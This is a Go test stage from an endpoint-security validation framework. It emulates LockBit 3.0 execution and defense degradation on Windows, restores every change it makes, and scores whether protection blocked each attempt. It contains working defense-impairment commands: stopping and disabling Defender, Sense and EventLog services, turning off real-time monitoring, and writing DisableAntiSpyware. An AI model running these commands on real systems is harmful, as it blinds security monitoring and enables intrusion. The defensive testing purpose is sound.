// Stage 1 — T1059.001 PowerShell + T1562.001 Impair Defenses + T1112 Modify Registry
// F0RT1KA Security Testing Framework
// SB-PC-2026-001 [LOCKBIT] — Objetivo 1: Ejecución y degradación de defensas en los endpoints
//
// LockBit 3.0 affiliates characteristically degrade endpoint controls before the
// intrusion proceeds (AA23-075A: sc stop/config against security services,
// Set-MpPreference -DisableRealtimeMonitoring, DisableAntiSpyware policy value).
// This stage:
//   1. Drops a benign recon PS1 to LOG_DIR and executes it with
//      `powershell.exe -ExecutionPolicy Bypass -File` (T1059.001). Output is
//      captured to LOG_DIR via io.MultiWriter.
//   2. ATTEMPTS `sc.exe stop` + `sc.exe config <svc> start= disabled` against
//      security services by REGISTRY service name (WinDefend, WdNisSvc, Sense,
//      EventLog). After each attempt the service state is RE-QUERIED — a service
//      still RUNNING after the stop attempt is positive evidence the attempt was
//      prevented (Bug Prevention Rules 5/6). Any service actually stopped is
//      RESTORED to its original start type and restarted (self-healing).
//   3. ATTEMPTS Set-MpPreference -DisableRealtimeMonitoring $true, then reads the
//      value back with Get-MpPreference. If the value changed it is RESTORED
//      immediately. Blocked = value unchanged after the attempt.
//   4. Creates a LockBit-style sandbox marker key (HKCU\Software\LockBitSim, or
//      the HKLM equivalent under SYSTEM context) and ATTEMPTS to write
//      HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware=1.
//      The value is read back; if the write stuck it is DELETED immediately
//      (T1112). Classification uses read-back evidence only.
//
// SAFETY: attempts only — anything that takes effect is reverted in-line. The
// sandbox marker key is removed in cleanup. No real defense state persists.
//
// EXIT CODES: 0 = attack actions executed unimpeded (endpoint degraded or
// PowerShell execution unhindered with at least one degradation landing),
// 126 = positive protection evidence (PS exec blocked, or every degradation
// attempt prevented), 105 = recon script quarantined on drop, 999 = test error.

//go:build windows
// +build windows

package main

import (
	"bytes"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"golang.org/x/sys/windows/registry"
)

const (
	TEST_UUID      = "298cc137-ea39-4cf0-9b2d-b1c59a3cbacb"
	TECHNIQUE_ID   = "T1059.001"
	TECHNIQUE_NAME = "Execution & Defense Degradation (T1059.001/T1562.001/T1112)"
	STAGE_ID       = 1
)

const (
	StageSuccess     = 0
	StageBlocked     = 126
	StageQuarantined = 105
	StageError       = 999
)

// Security services LockBit attempts to disable, by REGISTRY service name
// (Bug Prevention Rule 6 — never display names).
var targetServices = []string{"WinDefend", "WdNisSvc", "Sense", "EventLog"}

// Separate counters for critical metrics (Bug Prevention Rule 4).
var (
	degradationAttempts int
	degradationBlocked  int
	degradationSucceeded int
	psExecuted          bool
	elevatedContext     bool
)

func main() {
	AttachLogger(TEST_UUID, fmt.Sprintf("Stage %d: %s", STAGE_ID, TECHNIQUE_ID))
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Starting %s", TECHNIQUE_NAME))
	LogStageStart(STAGE_ID, TECHNIQUE_ID, TECHNIQUE_NAME)

	elevatedContext = isAdmin() || isSystemContext()
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Execution context: elevated=%v system=%v", elevatedContext, isSystemContext()))

	exitCode := performTechnique()

	switch exitCode {
	case StageSuccess:
		fmt.Printf("[STAGE %s] Attack actions executed without prevention\n", TECHNIQUE_ID)
		LogMessage("SUCCESS", TECHNIQUE_ID, "Stage 1 completed - endpoint did not prevent execution/degradation")
		LogStageEnd(STAGE_ID, TECHNIQUE_ID, "success", "Execution and/or defense degradation completed unimpeded")
	case StageBlocked:
		fmt.Printf("[STAGE %s] Technique prevented (positive evidence)\n", TECHNIQUE_ID)
		LogMessage("BLOCKED", TECHNIQUE_ID, "Stage 1 prevented by protection layer")
		LogStageBlocked(STAGE_ID, TECHNIQUE_ID, "Execution and all defense-degradation attempts prevented")
	case StageQuarantined:
		fmt.Printf("[STAGE %s] Recon script quarantined on drop\n", TECHNIQUE_ID)
		LogMessage("BLOCKED", TECHNIQUE_ID, "Recon PS1 quarantined after drop (os.Stat evidence)")
		LogStageBlocked(STAGE_ID, TECHNIQUE_ID, "Recon script quarantined on extraction")
	default:
		fmt.Printf("[STAGE %s] Stage error\n", TECHNIQUE_ID)
		LogMessage("ERROR", TECHNIQUE_ID, "Stage 1 ended in error - prerequisites not met or inconclusive")
		LogStageEnd(STAGE_ID, TECHNIQUE_ID, "error", "Stage error or inconclusive prerequisites")
	}
	os.Exit(exitCode)
}

func performTechnique() int {
	// ------------------------------------------------------------------
	// Sub-technique 1: T1059.001 — drop + execute recon PowerShell
	// ------------------------------------------------------------------
	fmt.Printf("[STAGE %s] Phase 1: Dropping recon PowerShell script to %s\n", TECHNIQUE_ID, LOG_DIR)
	LogMessage("INFO", TECHNIQUE_ID, "T1059.001: dropping benign recon PS1, executing with -ExecutionPolicy Bypass")

	if err := os.MkdirAll(LOG_DIR, 0755); err != nil {
		LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("failed to create log directory: %v", err))
		return StageError
	}

	ps1Path := filepath.Join(LOG_DIR, "lockbit_recon.ps1")
	if err := os.WriteFile(ps1Path, []byte(reconScript), 0644); err != nil {
		LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("failed to write recon script: %v", err))
		return StageError
	}
	LogFileDropped("lockbit_recon.ps1", ps1Path, int64(len(reconScript)), false)

	// Quarantine check (Bug Prevention Rule 3): sleep + os.Stat
	time.Sleep(2 * time.Second)
	if _, err := os.Stat(ps1Path); os.IsNotExist(err) {
		LogMessage("CRITICAL", TECHNIQUE_ID, "Recon script removed from disk after drop - quarantine evidence")
		return StageQuarantined
	}

	psOutputPath := filepath.Join(LOG_DIR, "lockbit_recon_output.txt")
	psExit, psOutput := runPowerShellScript(ps1Path, psOutputPath)
	LogProcessExecution("powershell.exe",
		fmt.Sprintf("powershell.exe -ExecutionPolicy Bypass -File %s", ps1Path),
		0, psExit == 0, psExit, psOutput)

	psLower := strings.ToLower(psOutput)
	switch {
	case psExit == -1 && containsAny(psLower, []string{"access is denied", "access denied", "blocked by", "group policy"}):
		// The interpreter itself failed to start with OS-emitted denial evidence.
		LogMessage("CRITICAL", TECHNIQUE_ID, fmt.Sprintf("PowerShell interpreter start returned denial evidence: %s", psOutput))
		return StageBlocked
	case psExit == -1:
		LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("PowerShell interpreter failed to start: %s", psOutput))
		return StageError
	case psExit != 0 && containsAny(psLower, []string{"access is denied", "unauthorizedaccess", "blocked by group policy"}):
		LogMessage("CRITICAL", TECHNIQUE_ID, fmt.Sprintf("PowerShell execution returned denial evidence: %s", psOutput))
		return StageBlocked
	case psExit != 0:
		// Non-zero without denial evidence — recon may have partially run; not a block.
		LogMessage("WARNING", TECHNIQUE_ID, fmt.Sprintf("Recon script exited %d without denial evidence; continuing", psExit))
		psExecuted = true
	default:
		psExecuted = true
		LogMessage("INFO", TECHNIQUE_ID, "Recon PowerShell executed unimpeded (output captured)")
	}

	// ------------------------------------------------------------------
	// Sub-technique 2: T1562.001 — impair defenses: service stop/disable
	// attempts against security services + Defender RTP toggle.
	// Attempts only; corroborated by re-query (Rules 5/6).
	// ------------------------------------------------------------------
	fmt.Printf("[STAGE %s] Phase 2: Attempting security-service stop/disable (registry service names)\n", TECHNIQUE_ID)
	LogMessage("WARN", "T1562.001", "Attempting sc.exe stop/config against WinDefend, WdNisSvc, Sense, EventLog")

	for _, svc := range targetServices {
		attemptServiceTamper(svc)
	}

	fmt.Printf("[STAGE %s] Phase 2b: Attempting Set-MpPreference -DisableRealtimeMonitoring\n", TECHNIQUE_ID)
	attemptRealtimeMonitoringDisable()

	// ------------------------------------------------------------------
	// Sub-technique 3: T1112 — LockBit-style sandbox marker + Defender
	// policy value attempt with read-back classification.
	// ------------------------------------------------------------------
	fmt.Printf("[STAGE %s] Phase 3: Registry modification (T1112)\n", TECHNIQUE_ID)
	attemptRegistryModification()

	// ------------------------------------------------------------------
	// Stage verdict — critical metrics only (Rule 4).
	//   - Any degradation action that took effect => stage succeeded (0).
	//   - Every evaluable degradation attempt positively prevented => 126.
	//   - PS executed but no degradation attempt was evaluable (e.g. not
	//     elevated) => 999 (prerequisite, not a block).
	// ------------------------------------------------------------------
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf(
		"Degradation metrics: attempts=%d blocked=%d succeeded=%d psExecuted=%v",
		degradationAttempts, degradationBlocked, degradationSucceeded, psExecuted))

	if degradationSucceeded > 0 {
		return StageSuccess
	}
	// Non-evaluable attempts decrement degradationAttempts, so at this point
	// attempts == blocked + succeeded. blocked == attempts means every
	// evaluable degradation was positively prevented.
	if degradationAttempts > 0 && degradationBlocked == degradationAttempts {
		return StageBlocked
	}
	if !psExecuted {
		return StageError
	}
	// No evaluable degradation evidence either way (e.g. non-elevated context
	// where OS ACLs, not a protection product, answer the attempts).
	return StageError
}

// attemptServiceTamper runs sc.exe stop + sc.exe config start= disabled against
// one service, then re-queries state. A service still RUNNING after the stop is
// positive prevention evidence; a STOPPED service is restored immediately.
func attemptServiceTamper(svc string) {
	// Pre-check: does the service exist, and what is its start type?
	queryOut, queryErr := runCommand("sc.exe", "query", svc)
	if queryErr != "" || !strings.Contains(queryOut, "SERVICE_NAME") {
		LogMessage("INFO", "T1562.001", fmt.Sprintf("Service %s not present - skipping (not counted)", svc))
		return
	}
	originalStart := queryStartType(svc)
	wasRunning := strings.Contains(queryOut, "RUNNING")

	degradationAttempts++

	stopOut, stopErr := runCommand("sc.exe", "stop", svc)
	LogProcessExecution("sc.exe", fmt.Sprintf("sc.exe stop %s", svc), 0, stopErr == "", 0, stopOut)
	cfgOut, cfgErr := runCommand("sc.exe", "config", svc, "start=", "disabled")
	LogProcessExecution("sc.exe", fmt.Sprintf("sc.exe config %s start= disabled", svc), 0, cfgErr == "", 0, cfgOut)

	// Re-query: the corroboration (Rule 5 — never trust empty/unclear output).
	time.Sleep(500 * time.Millisecond)
	postOut, _ := runCommand("sc.exe", "query", svc)
	stillRunning := strings.Contains(postOut, "RUNNING")
	nowStopped := strings.Contains(postOut, "STOPPED") && !strings.Contains(postOut, "RUNNING")

	if stillRunning && wasRunning {
		// Attempt did not take effect. Only count as prevention when running
		// elevated — as a non-admin the denial is the service ACL, not a
		// protection action (Rule 8).
		if elevatedContext {
			degradationBlocked++
			fmt.Printf("[STAGE %s]   %s still RUNNING after stop attempt - prevention evidence\n", TECHNIQUE_ID, svc)
			LogMessage("INFO", "T1562.001", fmt.Sprintf("%s still RUNNING after stop attempt (elevated context) - tamper protection evidence", svc))
		} else {
			degradationAttempts-- // not evaluable in this context
			LogMessage("INFO", "T1562.001", fmt.Sprintf("%s stop attempt unanswered in non-elevated context - not counted", svc))
		}
		return
	}

	if nowStopped || (!wasRunning && !stillRunning) {
		degradationSucceeded++
		fmt.Printf("[STAGE %s]   WARNING: %s was stopped/disabled - restoring immediately\n", TECHNIQUE_ID, svc)
		LogMessage("CRITICAL", "T1562.001", fmt.Sprintf("Service %s stop/disable took effect - restoring original state", svc))
		restoreService(svc, originalStart)
		return
	}

	// Unclear post-state — no positive evidence either way.
	degradationAttempts--
	LogMessage("WARNING", "T1562.001", fmt.Sprintf("%s post-attempt state unclear (stop out=%q) - not counted", svc, stopOut))
}

// queryStartType parses `sc.exe qc` output for the START_TYPE line.
func queryStartType(svc string) string {
	out, err := runCommand("sc.exe", "qc", svc)
	if err != "" {
		return "auto"
	}
	lower := strings.ToLower(out)
	switch {
	case strings.Contains(lower, "disabled"):
		return "disabled"
	case strings.Contains(lower, "demand_start"), strings.Contains(lower, "demand start"):
		return "demand"
	case strings.Contains(lower, "auto_start"), strings.Contains(lower, "auto start"):
		return "auto"
	}
	return "auto"
}

// restoreService returns a service to its original start type and starts it.
func restoreService(svc, startType string) {
	if _, err := runCommand("sc.exe", "config", svc, "start=", startType); err != "" {
		LogMessage("WARNING", "T1562.001", fmt.Sprintf("restore: sc config %s start= %s returned: %s", svc, startType, err))
	}
	if _, err := runCommand("sc.exe", "start", svc); err != "" {
		// EventLog and friends may already be restarting; log only.
		LogMessage("INFO", "T1562.001", fmt.Sprintf("restore: sc start %s returned: %s", svc, err))
	}
	LogMessage("INFO", "T1562.001", fmt.Sprintf("Service %s restored to start=%s and start requested", svc, startType))
}

// attemptRealtimeMonitoringDisable tries Set-MpPreference -DisableRealtimeMonitoring
// $true and reads the value back. If the change stuck it is reverted immediately.
func attemptRealtimeMonitoringDisable() {
	// Pre-check: is Defender present at all?
	readBack, readErr := runCommand("powershell.exe", "-NoProfile", "-Command",
		"(Get-MpPreference).DisableRealtimeMonitoring")
	if readErr != "" && !strings.Contains(readBack, "False") && !strings.Contains(readBack, "True") {
		LogMessage("INFO", "T1562.001", "Get-MpPreference unavailable (Defender not present?) - RTP toggle not evaluable")
		return
	}

	degradationAttempts++

	setOut, setErr := runCommand("powershell.exe", "-NoProfile", "-Command",
		"Set-MpPreference -DisableRealtimeMonitoring $true")
	LogProcessExecution("powershell.exe", "Set-MpPreference -DisableRealtimeMonitoring $true", 0, setErr == "", 0, setOut)

	time.Sleep(500 * time.Millisecond)
	postOut, _ := runCommand("powershell.exe", "-NoProfile", "-Command",
		"(Get-MpPreference).DisableRealtimeMonitoring")

	if strings.Contains(postOut, "True") {
		degradationSucceeded++
		fmt.Printf("[STAGE %s]   WARNING: realtime monitoring was disabled - restoring immediately\n", TECHNIQUE_ID)
		LogMessage("CRITICAL", "T1562.001", "DisableRealtimeMonitoring took effect - restoring to $false")
		restoreOut, _ := runCommand("powershell.exe", "-NoProfile", "-Command",
			"Set-MpPreference -DisableRealtimeMonitoring $false")
		LogProcessExecution("powershell.exe", "Set-MpPreference -DisableRealtimeMonitoring $false (restore)", 0, true, 0, restoreOut)
		return
	}

	if strings.Contains(postOut, "False") {
		if elevatedContext {
			degradationBlocked++
			fmt.Printf("[STAGE %s]   DisableRealtimeMonitoring unchanged (False) after attempt - prevention evidence\n", TECHNIQUE_ID)
			LogMessage("INFO", "T1562.001", "RTP toggle did not take effect (tamper protection) - read-back evidence")
		} else {
			degradationAttempts--
			LogMessage("INFO", "T1562.001", "RTP toggle unanswered in non-elevated context - not counted")
		}
		return
	}

	degradationAttempts--
	LogMessage("WARNING", "T1562.001", fmt.Sprintf("RTP read-back unclear (%q) - not counted", postOut))
}

// attemptRegistryModification creates the LockBit-style sandbox marker and
// attempts the DisableAntiSpyware policy write with read-back + immediate delete.
func attemptRegistryModification() {
	// Sandbox marker — benign, hive chosen by execution context (Rule 2).
	hive := registry.CURRENT_USER
	hiveName := "HKCU"
	if isSystemContext() {
		hive = registry.LOCAL_MACHINE
		hiveName = "HKLM"
	}
	markerPath := `Software\LockBitSim`

	key, _, err := registry.CreateKey(hive, markerPath, registry.SET_VALUE|registry.QUERY_VALUE)
	if err != nil {
		LogMessage("WARNING", "T1112", fmt.Sprintf("sandbox marker key create returned: %v", err))
	} else {
		_ = key.SetStringValue("InstallID", "F0RT1KA-SB-PC-2026-001-LockBitSim")
		_ = key.SetDWordValue("Marker", 1)
		if val, _, rerr := key.GetStringValue("InstallID"); rerr == nil {
			fmt.Printf("[STAGE %s]   Sandbox marker written: %s\\%s InstallID=%s\n", TECHNIQUE_ID, hiveName, markerPath, val)
			LogMessage("INFO", "T1112", fmt.Sprintf("Registry marker written to %s\\%s (read-back verified)", hiveName, markerPath))
		}
		key.Close()
		defer func() {
			if derr := registry.DeleteKey(hive, markerPath); derr != nil {
				LogMessage("WARNING", "T1112", fmt.Sprintf("cleanup: delete marker key returned: %v", derr))
			} else {
				LogMessage("INFO", "T1112", "cleanup: sandbox marker key removed")
			}
		}()
	}

	// DisableAntiSpyware policy attempt — HKLM write, normally succeeds when
	// elevated. Read-back + immediate delete if it stuck.
	degradationAttempts++
	polPath := `SOFTWARE\Policies\Microsoft\Windows Defender`
	polKey, _, err := registry.CreateKey(registry.LOCAL_MACHINE, polPath, registry.SET_VALUE|registry.QUERY_VALUE)
	if err != nil {
		if elevatedContext && containsAny(strings.ToLower(err.Error()), []string{"access is denied", "access denied"}) {
			degradationBlocked++
			fmt.Printf("[STAGE %s]   Defender policy key write returned OS denial (elevated) - prevention evidence\n", TECHNIQUE_ID)
			LogMessage("INFO", "T1112", fmt.Sprintf("HKLM policy key open returned denial in elevated context: %v", err))
		} else {
			degradationAttempts--
			LogMessage("INFO", "T1112", fmt.Sprintf("HKLM policy key open not evaluable in this context: %v", err))
		}
		return
	}
	defer polKey.Close()

	if err := polKey.SetDWordValue("DisableAntiSpyware", 1); err != nil {
		if elevatedContext && containsAny(strings.ToLower(err.Error()), []string{"access is denied", "access denied"}) {
			degradationBlocked++
			LogMessage("INFO", "T1112", fmt.Sprintf("DisableAntiSpyware write returned OS denial in elevated context: %v", err))
		} else {
			degradationAttempts--
			LogMessage("INFO", "T1112", fmt.Sprintf("DisableAntiSpyware write not evaluable in this context: %v", err))
		}
		return
	}

	// Read back — did the write stick?
	val, _, rerr := polKey.GetIntegerValue("DisableAntiSpyware")
	if rerr == nil && val == 1 {
		degradationSucceeded++
		fmt.Printf("[STAGE %s]   WARNING: DisableAntiSpyware=1 written - deleting immediately\n", TECHNIQUE_ID)
		LogMessage("CRITICAL", "T1112", "DisableAntiSpyware policy value written (read-back verified) - deleting now")
		if derr := polKey.DeleteValue("DisableAntiSpyware"); derr != nil {
			LogMessage("CRITICAL", "T1112", fmt.Sprintf("cleanup: failed to delete DisableAntiSpyware value: %v", derr))
		} else {
			LogMessage("INFO", "T1112", "cleanup: DisableAntiSpyware value deleted")
		}
		return
	}

	if elevatedContext {
		degradationBlocked++
		LogMessage("INFO", "T1112", "DisableAntiSpyware write did not persist on read-back (elevated context) - prevention evidence")
	} else {
		degradationAttempts--
		LogMessage("INFO", "T1112", "DisableAntiSpyware read-back not evaluable in this context")
	}
}

// runPowerShellScript executes a PS1 with -ExecutionPolicy Bypass, capturing
// stdout+stderr via io.MultiWriter to both console and a LOG_DIR file.
// Returns (exitCode, combinedOutput). exitCode -1 means the process failed to start.
func runPowerShellScript(scriptPath, outputPath string) (int, string) {
	cmd := exec.Command("powershell.exe", "-ExecutionPolicy", "Bypass", "-File", scriptPath)
	var buf bytes.Buffer
	outFile, err := os.Create(outputPath)
	if err != nil {
		LogMessage("WARNING", TECHNIQUE_ID, fmt.Sprintf("failed to create output capture file: %v", err))
		cmd.Stdout = io.MultiWriter(os.Stdout, &buf)
		cmd.Stderr = io.MultiWriter(os.Stderr, &buf)
	} else {
		defer outFile.Close()
		cmd.Stdout = io.MultiWriter(os.Stdout, &buf, outFile)
		cmd.Stderr = io.MultiWriter(os.Stderr, &buf, outFile)
	}

	if err := cmd.Start(); err != nil {
		return -1, fmt.Sprintf("process start returned: %v", err)
	}
	err = cmd.Wait()
	if err != nil {
		if exitErr, ok := err.(*exec.ExitError); ok {
			return exitErr.ExitCode(), buf.String()
		}
		return -1, fmt.Sprintf("process wait returned: %v", err)
	}
	return 0, buf.String()
}

// runCommand executes a command and returns (combinedOutput, errorString).
// errorString is empty on success. Wrappers describe the operation only (Rule 1).
func runCommand(name string, args ...string) (string, string) {
	cmd := exec.Command(name, args...)
	out, err := cmd.CombinedOutput()
	outStr := strings.TrimSpace(string(out))
	if err != nil {
		if outStr != "" {
			return outStr, fmt.Sprintf("%s returned: %v | %s", name, err, outStr)
		}
		return "", fmt.Sprintf("%s returned: %v", name, err)
	}
	return outStr, ""
}

// containsAny reports whether s contains any of the tokens (case-insensitive
// caller passes lowercase s).
func containsAny(s string, tokens []string) bool {
	for _, t := range tokens {
		if strings.Contains(s, t) {
			return true
		}
	}
	return false
}

// isSystemContext reports whether the process runs as SYSTEM (Rule 2).
func isSystemContext() bool {
	username := os.Getenv("USERNAME")
	return strings.HasSuffix(username, "$") || strings.EqualFold(username, "SYSTEM")
}

// reconScript is the benign LockBit-style discovery payload (T1059.001).
// System recon only: hostname, user, domain, AV products, OS, network.
const reconScript = `# F0RT1KA SB-PC-2026-001 - LockBit 3.0 Stage 1 recon (benign discovery only)
function Test-Administrator {
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Set-ExecutionPolicyBypass {
    try {
        Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force -ErrorAction SilentlyContinue
        return $true
    } catch {
        Write-Host "[!] Failed to bypass execution policy: $_" -ForegroundColor Red
        return $false
    }
}

Set-ExecutionPolicyBypass | Out-Null

Write-Output "=== F0RT1KA LockBit Simulation: System Recon (SYNTHETIC) ==="
Write-Output ("Timestamp : " + (Get-Date -Format o))
Write-Output ("Hostname  : " + $env:COMPUTERNAME)
Write-Output ("User      : " + (whoami))
Write-Output ("Domain    : " + $env:USERDOMAIN)
Write-Output ("IsAdmin   : " + (Test-Administrator))
Write-Output ""
Write-Output "--- AV Products (root\SecurityCenter2) ---"
try {
    Get-CimInstance -Namespace root\SecurityCenter2 -ClassName AntiVirusProduct -ErrorAction Stop |
        Select-Object displayName, productState, pathToSignedProductExe | Format-List
} catch {
    Write-Output ("AV enumeration returned: " + $_.Exception.Message)
}
Write-Output "--- Operating System ---"
Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, BuildNumber, OSArchitecture | Format-List
Write-Output "--- IPv4 Addresses ---"
try {
    Get-NetIPAddress -AddressFamily IPv4 -ErrorAction Stop |
        Select-Object InterfaceAlias, IPAddress | Format-Table -AutoSize
} catch {
    Write-Output ("Net enumeration returned: " + $_.Exception.Message)
}
Write-Output "=== Recon complete ==="
`
